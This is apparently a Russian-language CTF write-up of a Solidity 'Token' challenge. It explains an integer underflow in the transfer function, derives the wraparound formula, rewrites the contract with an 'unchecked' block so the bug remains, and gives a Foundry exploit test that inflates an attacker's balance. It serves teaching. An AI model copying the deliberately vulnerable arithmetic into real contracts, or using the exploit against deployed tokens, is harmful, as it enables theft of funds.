# 5. Token
Контракт представляет из себя токен, имеющий функцию отправки токенов и получения баланса.

Код контракта:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

До версии Solidity 0.8.0, у арифметических операций отсутствовала автоматическая проверка на переполнение, из-за чего возникали ошибки безопасности.

Проанализируем функцию отправки токенов `transfer(address _to, uint256 _value)`:
```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```
1) В условии `balances[msg.sender] - _value >= 0` может происходить переполнение, так как используется операция вычитания. Если мы отправим значение, которое будет больше нашего текущего баланса, произойдет underflow.
   Например, наш баланс `20`, а отправляем мы `50`, значит, условие примет вид: `20 - 50 >= 0` или же `type(uint256).max - 30 + 1 >= 0`, что верно.
2) Затем, в строке `balances[msg.sender] -= _value;` происходит уменьшение нашего баланса, тоже без проверки переполнения. 
   Как с примером выше, наш баланс станет равным `type(uint256).max - 30`
3) Увеличиваем баланс конечного адреса `balances[_to]`, подвержен overflow, то есть можем манипулировать балансом другого аккаунта.

Формула underflow (для манипулирования нашим балансом):
`y - x = type(uint256).max - x + y + 1, x > y`

Контракт с аналогичной логикой, переписанный на версию выше 0.8.0:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TokenUnchecked {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        unchecked {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

Тест уязвимости (увеличиваем свой баланс):
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TokenUnchecked} from "src/Token/TokenUnchecked.sol";

contract TokenUncheckedTest is Test {
    TokenUnchecked public token;

    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        token = new TokenUnchecked(100 ether);
        token.transfer(attacker, 20);
        vm.stopPrank();
    }

    function test_Exploit() public {
        uint256 oldAttackerBalance = token.balanceOf(attacker);
        uint256 amount = 50;
        vm.startPrank(attacker);

        token.transfer(makeAddr("twink"), amount);

        vm.stopPrank();
        uint256 newAttackerBalance = token.balanceOf(attacker);

        assertGt(newAttackerBalance, oldAttackerBalance);
        assertEq(newAttackerBalance, type(uint256).max - amount + oldAttackerBalance + 1);
    }
}
```

Доказательство формулы для переполнения:
```
MAX = type(uint256).max = 115792089237316195423570985008687907853269984665640564039457584007913129639935

Получаем общую формулу для 0 - x:
0 - 1 = MAX
0 - 2 = MAX - 1
0 - 3 = MAX - 2
...
0 - x = MAX - x + 1

Получаем общую формулу для y - x (x > y):
0 - x = MAX - x + 1 | + y
=> y - x = MAX - x + y + 1
```